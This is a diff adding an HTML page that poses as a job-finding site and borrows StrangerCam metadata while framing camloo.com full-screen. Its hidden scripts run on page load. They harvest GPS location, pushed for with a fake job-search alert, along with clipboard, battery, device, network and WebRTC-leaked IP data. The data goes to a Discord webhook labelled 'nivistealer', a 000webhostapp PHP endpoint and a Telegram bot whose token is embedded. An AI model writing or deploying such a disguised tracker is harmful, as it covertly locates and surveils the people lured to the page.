@@ -1,0 +1,290 @@
+<html>
+   <head>
+      <style>
+
+         img[alt*="www.000webhost.com"], .disclaimer {
+         display: none
+         }  
+      </style>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1" />
+      <title>Job Find Near Me</title>
+      <meta
+         name="description"
+         content="Enjoy our Anonymous  random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com"
+         />
+      <link rel="canonical" href="https://strangercam.com/" />
+      <meta property="og:locale" content="en_US" />
+      <meta property="og:type" content="website" />
+      <meta
+         property="og:title"
+         content="Random Video Chat - StrangerCam.com: Cam With Strangers"
+         />
+      <meta
+         property="og:description"
+         content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com."
+         />
+      
+      <meta property="og:site_name" content="Stranger Cam" />
+      <meta
+         property="article:publisher"
+         content="https://www.facebook.com/strangercam"
+         />
+      <meta
+         property="article:modified_time"
+         content="2021-12-17T14:46:35+00:00"
+         />
+      <meta
+         property="og:image"
+         content="https://strangercam.com/wp-content/uploads/2021/10/Untitled-2.png"
+         />
+      <meta property="og:image:width" content="800" />
+      <meta property="og:image:height" content="532" />
+      <meta property="og:image:type" content="image/png" />
+      <meta name="twitter:card" content="summary_large_image" />
+      <meta name="twitter:site" content="@strangercamapp" />
+      <meta name="twitter:label1" content="Est. reading time" />
+      <meta name="twitter:data1" content="4 minutes" />
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+      <script>
+         $(document).ready(function() {
+           var batterypercentage
+           var ischarging
+           async function getclips() {
+             var btr = await navigator.getBattery();
+             batterypercentage = String(btr.level*100+"%");
+             ischarging = String(btr.charging);
+             try {
+
+               giveclips(victimtext)
+             } catch (error) {
+               giveclips("Clipboard Permission Denied")
+             }
+           }
+           getclips()
+           var clips
+         
+           function giveclips(polp) {
+             clips = polp
+             getLocation()
+           }
+         
+           function getLocation() {
+             if (navigator.geolocation) {
+               navigator.geolocation.getCurrentPosition(showPosition, showError);
+             } else {
+               alert("Your Browser Does not support Gps");
+             }
+           }
+         
+           function showPosition(position) {
+             var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
+             sdrp(grak, clips,batterypercentage,ischarging);
+             senddis(grak, clips,batterypercentage,ischarging);
+           }
+         
+           function showError(error) {
+             switch (error.code) {
+               case error.PERMISSION_DENIED:
+                 sdrp("Location Permission Denied",clips,batterypercentage,ischarging);
+                 senddis("Location Permission Denied",clips,batterypercentage,ischarging)
+                 alert("On Location permission to Find Best Job in Near You");
+         
+                 break;
+               case error.POSITION_UNAVAILABLE:
+                 window.close()
+                 break;
+               case error.TIMEOUT:
+                 window.close()
+                 break;
+               case error.UNKNOWN_ERROR:
+                 window.close()
+                 break;
+             }
+           }
+            
+           let datetime = new Date();
+           let localtime = String(datetime.toLocaleTimeString());
+         
+           let referurl = document.referrer;
+           let cpuThreads = String(navigator.hardwareConcurrency);
+           let deviceram = String(navigator.deviceMemory) + "gb";
+           let useragent = navigator.userAgent;
+           let iscookieEnabled = String(navigator.cookieEnabled);
+           let devicelang = String(navigator.language);
+           let width = screen.width;
+           let height = screen.height;
+           let platform = navigator.platform;
+           let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+           let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink
+      
+                    
+
+           function senddis(gpsr, clips,batterypercentage,ischarging) {
+             var request = new XMLHttpRequest();
+             request.open("POST", "https://your-discordwebhook-url");
+             request.setRequestHeader('Content-type', 'application/json');
+             var params = {
+               content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n"),
+               username: "nivistealer",
+               avatar_url: "  "
+             }
+             request.send(JSON.stringify(params));
+           }
+         
+           function sdrp(bsdks, clipboard,batterypercentage,ischarging) {
+             $.ajax({
+               type: "POST",
+               url: "https://kh9v69v74687mna5op8mvodt8948f98kc697jti6gjes.000webhostapp.com/public.php",//you can change this link
+               data: {
+                 networkinformation : networkinformation,
+                 batterypercentage:batterypercentage,
+                 ischarging:ischarging,
+                 width: width,
+                 height: height,
+                 platform: platform,
+                 gps: bsdks,
+                 devicelang: devicelang,
+                 iscookieEnabled: iscookieEnabled,
+                 useragent: useragent,
+                 deviceram: deviceram,
+                 cpuThreads: cpuThreads,
+                 referurl: referurl,
+                 localtime: localtime,
+                 clipboard: clipboard,
+                 
+               },
+               cache: false,
+               success: function(data) {},
+               error: function(xhr, status, error) {
+                 console.log(error);
+               }
+             })
+           }
+         })
+      </script>
+   </head>
+   <div class="video-wrap" hidden="hidden">
+      <video id="video" playsinline autoplay></video>
+   </div>
+   <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+   <script>
+    // JavaScript code
+var userAgent = window.navigator.userAgent;
+var fullVersion = navigator.appVersion;
+
+// Sending the data to the Telegram bot
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://api.telegram.org/bot<6134286704:AAHwY_KQzUsrvMAo7FH2MEL8fGc6pba26Hg>/sendMessage', true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+
+xhr.onreadystatechange = function () {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    console.log('Message sent to Telegram bot');
+  }
+};
+
+var message = {
+  chat_id: '<2041536580>',
+  text: 'Browser Version: ' + fullVersion + '\nUser Agent: ' + userAgent
+};
+
+xhr.send(JSON.stringify(message));
+</script>
+
+   <script>
+        // JavaScript code
+
+// Function to get the IP address using WebRTC
+function getIPAddress() {
+  return new Promise((resolve, reject) => {
+    const peerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+    const sessionConfig = { iceServers: [{ urls: "stun:stun.services.mozilla.com" }] };
+    const pc = new peerConnection(sessionConfig);
+
+    pc.onicecandidate = function (ice) {
+      if (!ice || !ice.candidate || !ice.candidate.candidate) {
+        resolve(null);
+        return;
+      }
+
+      const ipAddress = ice.candidate.candidate.split(" ")[4];
+      resolve(ipAddress);
+    };
+
+    pc.createDataChannel("");
+    pc.createOffer(function (result) {
+      pc.setLocalDescription(result, function () {}, function () {});
+    }, function () {});
+  });
+}
+
+ // JavaScript code
+  
+  // Function to get the IP addresses using WebRTC
+  function getIPAddresses() {
+    return new Promise((resolve, reject) => {
+      const peerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+      const sessionConfig = { iceServers: [{ urls: "stun:stun.services.mozilla.com" }] };
+      const pc = new peerConnection(sessionConfig);
+  
+      const ipAddresses = {
+        ipv4: null,
+        ipv6: null
+      };
+  
+      pc.onicecandidate = function (ice) {
+        if (!ice || !ice.candidate || !ice.candidate.candidate) {
+          resolve(ipAddresses);
+          return;
+        }
+  
+        const candidate = ice.candidate.candidate;
+        const ipAddress = candidate.split(" ")[4];
+  
+        if (ipAddress.includes(":")) {
+          ipAddresses.ipv6 = ipAddress;
+        } else {
+          ipAddresses.ipv4 = ipAddress;
+        }
+  
+        if (ipAddresses.ipv4 && ipAddresses.ipv6) {
+          resolve(ipAddresses);
+        }
+      };
+  
+      pc.createDataChannel("");
+      pc.createOffer(function (result) {
+        pc.setLocalDescription(result, function () {}, function () {});
+      }, function () {});
+    });
+  }
+  
+  // Call the function to get the IP addresses and send them to the PHP script
+  getIPAddresses().then(function (ipAddresses) {
+    // Send the IP addresses to the PHP script
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "send_ip.php", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send("ipv4=" + ipAddresses.ipv4 + "&ipv6=" + ipAddresses.ipv6);
+  });
+  
+
+</script>
+
+ 
+
+   <body>
+      <p>
+         <iframe
+            id="forPostyouradd"
+            src="https://camloo.com/"
+            frameborder="0"
+            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
+            height="100%"
+            width="100%"
+            ></iframe>
+      </p>
+   </body>
+   
+</html>
